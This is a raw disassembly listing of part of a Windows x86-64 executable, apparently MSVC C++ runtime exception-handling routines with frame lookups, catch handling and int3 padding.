   140002c2a:	4d 8b 14 24          	mov    (%r12),%r10
   140002c2e:	8b e8                	mov    %eax,%ebp
   140002c30:	4c 89 17             	mov    %r10,(%rdi)
   140002c33:	eb 63                	jmp    0x140002c98
   140002c35:	49 63 46 10          	movslq 0x10(%r14),%rax
   140002c39:	8d 4e ff             	lea    -0x1(%rsi),%ecx
   140002c3c:	8b f1                	mov    %ecx,%esi
   140002c3e:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002c42:	48 8d 1c 88          	lea    (%rax,%rcx,4),%rbx
   140002c46:	49 03 5f 08          	add    0x8(%r15),%rbx
   140002c4a:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   140002c4d:	7e 49                	jle    0x140002c98
   140002c4f:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   140002c52:	7f 44                	jg     0x140002c98
   140002c54:	49 8b 0f             	mov    (%r15),%rcx
   140002c57:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002c5c:	45 33 c0             	xor    %r8d,%r8d
   140002c5f:	ff 15 f3 d3 00 00    	call   *0xd3f3(%rip)        # 0x140010058
   140002c65:	4c 63 43 10          	movslq 0x10(%rbx),%r8
   140002c69:	33 c9                	xor    %ecx,%ecx
   140002c6b:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   140002c70:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   140002c74:	44 8b 10             	mov    (%rax),%r10d
   140002c77:	45 85 c9             	test   %r9d,%r9d
   140002c7a:	74 17                	je     0x140002c93
   140002c7c:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   140002c80:	48 63 02             	movslq (%rdx),%rax
   140002c83:	49 3b c2             	cmp    %r10,%rax
   140002c86:	74 0b                	je     0x140002c93
   140002c88:	ff c1                	inc    %ecx
   140002c8a:	48 83 c2 14          	add    $0x14,%rdx
   140002c8e:	41 3b c9             	cmp    %r9d,%ecx
   140002c91:	72 ed                	jb     0x140002c80
   140002c93:	41 3b c9             	cmp    %r9d,%ecx
   140002c96:	72 06                	jb     0x140002c9e
   140002c98:	85 f6                	test   %esi,%esi
   140002c9a:	75 99                	jne    0x140002c35
   140002c9c:	eb 14                	jmp    0x140002cb2
   140002c9e:	49 8b 04 24          	mov    (%r12),%rax
   140002ca2:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002ca6:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   140002cab:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   140002caf:	48 89 0f             	mov    %rcx,(%rdi)
   140002cb2:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002cb7:	48 8b c7             	mov    %rdi,%rax
   140002cba:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002cbf:	48 83 c4 20          	add    $0x20,%rsp
   140002cc3:	41 5f                	pop    %r15
   140002cc5:	41 5e                	pop    %r14
   140002cc7:	41 5c                	pop    %r12
   140002cc9:	5f                   	pop    %rdi
   140002cca:	5e                   	pop    %rsi
   140002ccb:	c3                   	ret
   140002ccc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002cd1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002cd6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002cdb:	57                   	push   %rdi
   140002cdc:	41 54                	push   %r12
   140002cde:	41 55                	push   %r13
   140002ce0:	41 56                	push   %r14
   140002ce2:	41 57                	push   %r15
   140002ce4:	48 83 ec 40          	sub    $0x40,%rsp
   140002ce8:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140002cef:	00 
   140002cf0:	4c 8b fa             	mov    %rdx,%r15
   140002cf3:	48 8b f1             	mov    %rcx,%rsi
   140002cf6:	49 8b d1             	mov    %r9,%rdx
   140002cf9:	48 8b cb             	mov    %rbx,%rcx
   140002cfc:	49 8b f9             	mov    %r9,%rdi
   140002cff:	45 8b f0             	mov    %r8d,%r14d
   140002d02:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   140002d05:	e8 12 04 00 00       	call   0x14000311c
   140002d0a:	45 33 d2             	xor    %r10d,%r10d
   140002d0d:	44 8b c8             	mov    %eax,%r9d
   140002d10:	85 ed                	test   %ebp,%ebp
   140002d12:	0f 84 df 00 00 00    	je     0x140002df7
   140002d18:	4c 8b 5f 08          	mov    0x8(%rdi),%r11
   140002d1c:	41 83 cc ff          	or     $0xffffffff,%r12d
   140002d20:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   140002d24:	45 8b c4             	mov    %r12d,%r8d
   140002d27:	45 8b ec             	mov    %r12d,%r13d
   140002d2a:	8b d5                	mov    %ebp,%edx
   140002d2c:	8d 7a ff             	lea    -0x1(%rdx),%edi
   140002d2f:	48 8d 0c bf          	lea    (%rdi,%rdi,4),%rcx
   140002d33:	49 8d 04 8b          	lea    (%r11,%rcx,4),%rax
   140002d37:	44 3b 4c 18 04       	cmp    0x4(%rax,%rbx,1),%r9d
   140002d3c:	7e 07                	jle    0x140002d45
   140002d3e:	44 3b 4c 18 08       	cmp    0x8(%rax,%rbx,1),%r9d
   140002d43:	7e 06                	jle    0x140002d4b
   140002d45:	8b d7                	mov    %edi,%edx
   140002d47:	85 ff                	test   %edi,%edi
   140002d49:	75 e1                	jne    0x140002d2c
   140002d4b:	85 d2                	test   %edx,%edx
   140002d4d:	74 10                	je     0x140002d5f
   140002d4f:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140002d52:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002d56:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140002d5a:	4c 03 cb             	add    %rbx,%r9
   140002d5d:	eb 03                	jmp    0x140002d62
   140002d5f:	4d 8b ca             	mov    %r10,%r9
   140002d62:	41 8b d2             	mov    %r10d,%edx
   140002d65:	49 8d 0c 1b          	lea    (%r11,%rbx,1),%rcx
   140002d69:	4d 85 c9             	test   %r9,%r9
   140002d6c:	74 11                	je     0x140002d7f
   140002d6e:	41 8b 41 04          	mov    0x4(%r9),%eax
   140002d72:	39 01                	cmp    %eax,(%rcx)
   140002d74:	7e 1e                	jle    0x140002d94
   140002d76:	41 8b 41 08          	mov    0x8(%r9),%eax
   140002d7a:	39 41 04             	cmp    %eax,0x4(%rcx)
   140002d7d:	7f 15                	jg     0x140002d94
   140002d7f:	44 3b 31             	cmp    (%rcx),%r14d
   140002d82:	7c 10                	jl     0x140002d94
   140002d84:	44 3b 71 04          	cmp    0x4(%rcx),%r14d
   140002d88:	7f 0a                	jg     0x140002d94
   140002d8a:	45 3b c4             	cmp    %r12d,%r8d
   140002d8d:	44 8b ea             	mov    %edx,%r13d
   140002d90:	44 0f 44 c2          	cmove  %edx,%r8d
   140002d94:	ff c2                	inc    %edx
   140002d96:	48 83 c1 14          	add    $0x14,%rcx
   140002d9a:	3b d5                	cmp    %ebp,%edx
   140002d9c:	72 cb                	jb     0x140002d69
   140002d9e:	41 8b c2             	mov    %r10d,%eax
   140002da1:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140002da6:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140002dab:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140002db0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002db4:	45 3b c4             	cmp    %r12d,%r8d
   140002db7:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140002dbb:	41 0f 45 c0          	cmovne %r8d,%eax
   140002dbf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002dc3:	41 8d 45 01          	lea    0x1(%r13),%eax
   140002dc7:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   140002dcc:	44 0f 45 d0          	cmovne %eax,%r10d
   140002dd0:	48 8b c6             	mov    %rsi,%rax
   140002dd3:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   140002dd8:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   140002ddd:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140002de1:	f3 0f 7f 4e 10       	movdqu %xmm1,0x10(%rsi)
   140002de6:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140002dea:	49 8b e3             	mov    %r11,%rsp
   140002ded:	41 5f                	pop    %r15
   140002def:	41 5e                	pop    %r14
   140002df1:	41 5d                	pop    %r13
   140002df3:	41 5c                	pop    %r12
   140002df5:	5f                   	pop    %rdi
   140002df6:	c3                   	ret
   140002df7:	e8 14 30 00 00       	call   0x140005e10
   140002dfc:	cc                   	int3
   140002dfd:	cc                   	int3
   140002dfe:	cc                   	int3
   140002dff:	cc                   	int3
   140002e00:	40 55                	rex push %rbp
   140002e02:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140002e07:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   140002e0e:	48 8b 05 eb 71 01 00 	mov    0x171eb(%rip),%rax        # 0x14001a000
   140002e15:	48 33 c4             	xor    %rsp,%rax
   140002e18:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   140002e1c:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   140002e20:	48 8d 05 99 e4 00 00 	lea    0xe499(%rip),%rax        # 0x1400112c0
   140002e27:	0f 10 00             	movups (%rax),%xmm0
   140002e2a:	4c 8b d9             	mov    %rcx,%r11
   140002e2d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002e32:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002e36:	0f 11 01             	movups %xmm0,(%rcx)
   140002e39:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140002e3d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140002e41:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140002e45:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140002e49:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140002e4d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140002e51:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140002e55:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140002e59:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140002e5d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140002e61:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   140002e68:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140002e6c:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   140002e70:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   140002e77:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   140002e7b:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   140002e82:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   140002e89:	48 8d 05 38 12 00 00 	lea    0x1238(%rip),%rax        # 0x1400040c8
   140002e90:	49 8b 0b             	mov    (%r11),%rcx
   140002e93:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   140002e97:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   140002e9b:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   140002e9f:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   140002ea3:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   140002ea7:	48 8b 45 57          	mov    0x57(%rbp),%rax
   140002eab:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   140002eaf:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   140002eb3:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140002eb7:	49 8b 42 40          	mov    0x40(%r10),%rax
   140002ebb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002ec0:	49 8b 42 28          	mov    0x28(%r10),%rax
   140002ec4:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   140002ec8:	45 33 c9             	xor    %r9d,%r9d
   140002ecb:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   140002ecf:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002ed4:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   140002ed8:	49 8b 12             	mov    (%r10),%rdx
   140002edb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002ee0:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   140002ee7:	19 
   140002ee8:	ff 15 e2 d1 00 00    	call   *0xd1e2(%rip)        # 0x1400100d0
   140002eee:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140002ef2:	48 33 cc             	xor    %rsp,%rcx
   140002ef5:	e8 66 e4 ff ff       	call   0x140001360
   140002efa:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   140002f01:	5d                   	pop    %rbp
   140002f02:	c3                   	ret
   140002f03:	cc                   	int3
   140002f04:	40 53                	rex push %rbx
   140002f06:	48 83 ec 20          	sub    $0x20,%rsp
   140002f0a:	48 8b d9             	mov    %rcx,%rbx
   140002f0d:	48 89 11             	mov    %rdx,(%rcx)
   140002f10:	e8 f7 f6 ff ff       	call   0x14000260c
   140002f15:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140002f19:	73 0b                	jae    0x140002f26
   140002f1b:	e8 ec f6 ff ff       	call   0x14000260c
   140002f20:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140002f24:	eb 02                	jmp    0x140002f28
   140002f26:	33 c9                	xor    %ecx,%ecx
   140002f28:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140002f2c:	e8 db f6 ff ff       	call   0x14000260c
   140002f31:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140002f35:	48 8b c3             	mov    %rbx,%rax
   140002f38:	48 83 c4 20          	add    $0x20,%rsp
   140002f3c:	5b                   	pop    %rbx
   140002f3d:	c3                   	ret
   140002f3e:	cc                   	int3
   140002f3f:	cc                   	int3
   140002f40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f45:	57                   	push   %rdi
   140002f46:	48 83 ec 20          	sub    $0x20,%rsp
   140002f4a:	48 8b f9             	mov    %rcx,%rdi
   140002f4d:	e8 ba f6 ff ff       	call   0x14000260c
   140002f52:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   140002f56:	75 35                	jne    0x140002f8d
   140002f58:	e8 af f6 ff ff       	call   0x14000260c
   140002f5d:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140002f61:	48 85 d2             	test   %rdx,%rdx
   140002f64:	74 27                	je     0x140002f8d
   140002f66:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140002f6a:	48 3b fa             	cmp    %rdx,%rdi
   140002f6d:	74 0a                	je     0x140002f79
   140002f6f:	48 8b d3             	mov    %rbx,%rdx
   140002f72:	48 85 db             	test   %rbx,%rbx
   140002f75:	74 16                	je     0x140002f8d
   140002f77:	eb ed                	jmp    0x140002f66
   140002f79:	e8 8e f6 ff ff       	call   0x14000260c
   140002f7e:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140002f82:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f87:	48 83 c4 20          	add    $0x20,%rsp
   140002f8b:	5f                   	pop    %rdi
   140002f8c:	c3                   	ret
   140002f8d:	e8 7e 2e 00 00       	call   0x140005e10
   140002f92:	cc                   	int3
   140002f93:	cc                   	int3
   140002f94:	48 83 ec 28          	sub    $0x28,%rsp
   140002f98:	e8 6f f6 ff ff       	call   0x14000260c
   140002f9d:	48 8b 40 60          	mov    0x60(%rax),%rax
   140002fa1:	48 83 c4 28          	add    $0x28,%rsp
   140002fa5:	c3                   	ret
   140002fa6:	cc                   	int3
   140002fa7:	cc                   	int3
   140002fa8:	48 83 ec 28          	sub    $0x28,%rsp
   140002fac:	e8 5b f6 ff ff       	call   0x14000260c
   140002fb1:	48 8b 40 68          	mov    0x68(%rax),%rax
   140002fb5:	48 83 c4 28          	add    $0x28,%rsp
   140002fb9:	c3                   	ret
   140002fba:	cc                   	int3
   140002fbb:	cc                   	int3
   140002fbc:	40 53                	rex push %rbx
   140002fbe:	48 83 ec 20          	sub    $0x20,%rsp
   140002fc2:	48 8b d9             	mov    %rcx,%rbx
   140002fc5:	e8 42 f6 ff ff       	call   0x14000260c
   140002fca:	48 89 58 60          	mov    %rbx,0x60(%rax)
   140002fce:	48 83 c4 20          	add    $0x20,%rsp
   140002fd2:	5b                   	pop    %rbx
   140002fd3:	c3                   	ret
   140002fd4:	40 53                	rex push %rbx
   140002fd6:	48 83 ec 20          	sub    $0x20,%rsp
   140002fda:	48 8b d9             	mov    %rcx,%rbx
   140002fdd:	e8 2a f6 ff ff       	call   0x14000260c
   140002fe2:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140002fe6:	48 83 c4 20          	add    $0x20,%rsp
   140002fea:	5b                   	pop    %rbx
   140002feb:	c3                   	ret
   140002fec:	48 8b c4             	mov    %rsp,%rax
   140002fef:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140002ff3:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140002ff7:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140002ffb:	57                   	push   %rdi
   140002ffc:	48 83 ec 40          	sub    $0x40,%rsp
   140003000:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140003004:	49 8b f9             	mov    %r9,%rdi
   140003007:	49 8b f0             	mov    %r8,%rsi
   14000300a:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000300e:	48 8b e9             	mov    %rcx,%rbp
   140003011:	e8 f6 f5 ff ff       	call   0x14000260c
   140003016:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000301a:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   14000301e:	e8 e9 f5 ff ff       	call   0x14000260c
   140003023:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140003027:	e8 e0 f5 ff ff       	call   0x14000260c
   14000302c:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140003030:	4c 8b cf             	mov    %rdi,%r9
   140003033:	4c 8b c6             	mov    %rsi,%r8
   140003036:	8b 11                	mov    (%rcx),%edx
   140003038:	48 8b cd             	mov    %rbp,%rcx
   14000303b:	48 03 50 60          	add    0x60(%rax),%rdx
   14000303f:	33 c0                	xor    %eax,%eax
   140003041:	88 44 24 38          	mov    %al,0x38(%rsp)
   140003045:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000304a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000304e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003053:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003058:	e8 7b 0f 00 00       	call   0x140003fd8
   14000305d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140003062:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140003067:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000306c:	48 83 c4 40          	add    $0x40,%rsp
   140003070:	5f                   	pop    %rdi
   140003071:	c3                   	ret
   140003072:	cc                   	int3
   140003073:	cc                   	int3
   140003074:	cc                   	int3
   140003075:	cc                   	int3
   140003076:	cc                   	int3
   140003077:	cc                   	int3
   140003078:	cc                   	int3
   140003079:	cc                   	int3
   14000307a:	cc                   	int3
   14000307b:	cc                   	int3
   14000307c:	cc                   	int3
   14000307d:	cc                   	int3
   14000307e:	cc                   	int3
   14000307f:	cc                   	int3
   140003080:	48 83 ec 28          	sub    $0x28,%rsp
   140003084:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   140003088:	4d 8b d0             	mov    %r8,%r10
   14000308b:	48 8b 01             	mov    (%rcx),%rax
   14000308e:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   140003092:	83 f8 fe             	cmp    $0xfffffffe,%eax
   140003095:	75 0b                	jne    0x1400030a2
   140003097:	4c 8b 02             	mov    (%rdx),%r8
   14000309a:	49 8b ca             	mov    %r10,%rcx
   14000309d:	e8 82 00 00 00       	call   0x140003124
   1400030a2:	48 83 c4 28          	add    $0x28,%rsp
   1400030a6:	c3                   	ret
   1400030a7:	cc                   	int3
   1400030a8:	40 53                	rex push %rbx
   1400030aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400030ae:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400030b3:	49 8b d8             	mov    %r8,%rbx
   1400030b6:	e8 41 fb ff ff       	call   0x140002bfc
   1400030bb:	48 8b 08             	mov    (%rax),%rcx
   1400030be:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1400030c2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400030c7:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   1400030cb:	48 83 c4 20          	add    $0x20,%rsp
   1400030cf:	5b                   	pop    %rbx
   1400030d0:	c3                   	ret
   1400030d1:	cc                   	int3
   1400030d2:	cc                   	int3
   1400030d3:	cc                   	int3
   1400030d4:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   1400030d8:	48 8b 01             	mov    (%rcx),%rax
   1400030db:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   1400030df:	c3                   	ret
   1400030e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400030e5:	57                   	push   %rdi
   1400030e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400030ea:	41 8b f9             	mov    %r9d,%edi
   1400030ed:	49 8b d8             	mov    %r8,%rbx
   1400030f0:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400030f5:	e8 02 fb ff ff       	call   0x140002bfc
   1400030fa:	48 8b 08             	mov    (%rax),%rcx
   1400030fd:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140003101:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140003106:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   14000310a:	7e 04                	jle    0x140003110
   14000310c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140003110:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003115:	48 83 c4 20          	add    $0x20,%rsp
   140003119:	5f                   	pop    %rdi
   14000311a:	c3                   	ret
   14000311b:	cc                   	int3
   14000311c:	4c 8b 02             	mov    (%rdx),%r8
   14000311f:	e9 00 00 00 00       	jmp    0x140003124
   140003124:	40 53                	rex push %rbx
   140003126:	48 83 ec 20          	sub    $0x20,%rsp
   14000312a:	49 8b d8             	mov    %r8,%rbx
   14000312d:	48 85 c9             	test   %rcx,%rcx
   140003130:	74 52                	je     0x140003184
   140003132:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140003136:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   14000313a:	4b 8d 04 1a          	lea    (%r10,%r11,1),%rax
   14000313e:	48 85 c0             	test   %rax,%rax
   140003141:	74 41                	je     0x140003184
   140003143:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   140003147:	45 33 c9             	xor    %r9d,%r9d
   14000314a:	45 85 c0             	test   %r8d,%r8d
   14000314d:	74 30                	je     0x14000317f
   14000314f:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   140003153:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   140003157:	49 03 d2             	add    %r10,%rdx
   14000315a:	48 3b da             	cmp    %rdx,%rbx
   14000315d:	72 08                	jb     0x140003167
   14000315f:	41 ff c1             	inc    %r9d
   140003162:	45 3b c8             	cmp    %r8d,%r9d
   140003165:	72 e8                	jb     0x14000314f
   140003167:	45 85 c9             	test   %r9d,%r9d
   14000316a:	74 13                	je     0x14000317f
   14000316c:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140003170:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   140003174:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   140003179:	48 83 c4 20          	add    $0x20,%rsp
   14000317d:	5b                   	pop    %rbx
   14000317e:	c3                   	ret
   14000317f:	83 c8 ff             	or     $0xffffffff,%eax
   140003182:	eb f5                	jmp    0x140003179
   140003184:	e8 87 2c 00 00       	call   0x140005e10
   140003189:	cc                   	int3
   14000318a:	cc                   	int3
   14000318b:	cc                   	int3
   14000318c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003191:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003196:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000319b:	41 55                	push   %r13
   14000319d:	41 56                	push   %r14
   14000319f:	41 57                	push   %r15
   1400031a1:	48 83 ec 30          	sub    $0x30,%rsp
   1400031a5:	4d 8b f1             	mov    %r9,%r14
   1400031a8:	49 8b d8             	mov    %r8,%rbx
   1400031ab:	48 8b f2             	mov    %rdx,%rsi
   1400031ae:	4c 8b e9             	mov    %rcx,%r13
   1400031b1:	33 ff                	xor    %edi,%edi
   1400031b3:	41 39 78 04          	cmp    %edi,0x4(%r8)
   1400031b7:	74 0f                	je     0x1400031c8
   1400031b9:	4d 63 78 04          	movslq 0x4(%r8),%r15
   1400031bd:	e8 d2 fd ff ff       	call   0x140002f94
   1400031c2:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   1400031c6:	eb 06                	jmp    0x1400031ce
   1400031c8:	48 8b d7             	mov    %rdi,%rdx
   1400031cb:	44 8b ff             	mov    %edi,%r15d
   1400031ce:	48 85 d2             	test   %rdx,%rdx
   1400031d1:	0f 84 77 01 00 00    	je     0x14000334e
   1400031d7:	45 85 ff             	test   %r15d,%r15d
   1400031da:	74 11                	je     0x1400031ed
   1400031dc:	e8 b3 fd ff ff       	call   0x140002f94
   1400031e1:	48 8b c8             	mov    %rax,%rcx
   1400031e4:	48 63 43 04          	movslq 0x4(%rbx),%rax
   1400031e8:	48 03 c8             	add    %rax,%rcx
   1400031eb:	eb 03                	jmp    0x1400031f0
   1400031ed:	48 8b cf             	mov    %rdi,%rcx
   1400031f0:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   1400031f4:	0f 84 54 01 00 00    	je     0x14000334e
   1400031fa:	39 7b 08             	cmp    %edi,0x8(%rbx)
   1400031fd:	75 08                	jne    0x140003207
   1400031ff:	39 3b                	cmp    %edi,(%rbx)
   140003201:	0f 8d 47 01 00 00    	jge    0x14000334e
   140003207:	39 3b                	cmp    %edi,(%rbx)
   140003209:	7c 0a                	jl     0x140003215
   14000320b:	48 63 43 08          	movslq 0x8(%rbx),%rax
   14000320f:	48 03 06             	add    (%rsi),%rax
   140003212:	48 8b f0             	mov    %rax,%rsi
   140003215:	f6 03 80             	testb  $0x80,(%rbx)
   140003218:	74 32                	je     0x14000324c
   14000321a:	41 f6 06 10          	testb  $0x10,(%r14)
   14000321e:	74 2c                	je     0x14000324c
   140003220:	48 8b 05 69 7e 01 00 	mov    0x17e69(%rip),%rax        # 0x14001b090
   140003227:	48 85 c0             	test   %rax,%rax
   14000322a:	74 20                	je     0x14000324c
   14000322c:	ff 15 86 d0 00 00    	call   *0xd086(%rip)        # 0x1400102b8
   140003232:	48 85 c0             	test   %rax,%rax
   140003235:	0f 84 2f 01 00 00    	je     0x14000336a
   14000323b:	48 85 f6             	test   %rsi,%rsi
   14000323e:	0f 84 26 01 00 00    	je     0x14000336a
   140003244:	48 89 06             	mov    %rax,(%rsi)
   140003247:	48 8b c8             	mov    %rax,%rcx
   14000324a:	eb 5f                	jmp    0x1400032ab
   14000324c:	f6 03 08             	testb  $0x8,(%rbx)
   14000324f:	74 1b                	je     0x14000326c
   140003251:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140003255:	48 85 c9             	test   %rcx,%rcx
   140003258:	0f 84 11 01 00 00    	je     0x14000336f
   14000325e:	48 85 f6             	test   %rsi,%rsi
   140003261:	0f 84 08 01 00 00    	je     0x14000336f
   140003267:	48 89 0e             	mov    %rcx,(%rsi)
   14000326a:	eb 3f                	jmp    0x1400032ab
   14000326c:	41 f6 06 01          	testb  $0x1,(%r14)
   140003270:	74 4a                	je     0x1400032bc
   140003272:	49 8b 55 28          	mov    0x28(%r13),%rdx
   140003276:	48 85 d2             	test   %rdx,%rdx
   140003279:	0f 84 f5 00 00 00    	je     0x140003374
   14000327f:	48 85 f6             	test   %rsi,%rsi
   140003282:	0f 84 ec 00 00 00    	je     0x140003374
   140003288:	4d 63 46 14          	movslq 0x14(%r14),%r8
   14000328c:	48 8b ce             	mov    %rsi,%rcx
   14000328f:	e8 9c c0 00 00       	call   0x14000f330
   140003294:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   140003299:	0f 85 ab 00 00 00    	jne    0x14000334a
   14000329f:	48 39 3e             	cmp    %rdi,(%rsi)
   1400032a2:	0f 84 a2 00 00 00    	je     0x14000334a
   1400032a8:	48 8b 0e             	mov    (%rsi),%rcx
   1400032ab:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1400032af:	e8 d4 f1 ff ff       	call   0x140002488
   1400032b4:	48 89 06             	mov    %rax,(%rsi)
   1400032b7:	e9 8e 00 00 00       	jmp    0x14000334a
   1400032bc:	41 39 7e 18          	cmp    %edi,0x18(%r14)
   1400032c0:	74 0f                	je     0x1400032d1
   1400032c2:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   1400032c6:	e8 dd fc ff ff       	call   0x140002fa8
   1400032cb:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   1400032cf:	eb 05                	jmp    0x1400032d6
   1400032d1:	48 8b cf             	mov    %rdi,%rcx
   1400032d4:	8b df                	mov    %edi,%ebx
   1400032d6:	48 85 c9             	test   %rcx,%rcx
   1400032d9:	75 34                	jne    0x14000330f
   1400032db:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   1400032df:	0f 84 94 00 00 00    	je     0x140003379
   1400032e5:	48 85 f6             	test   %rsi,%rsi
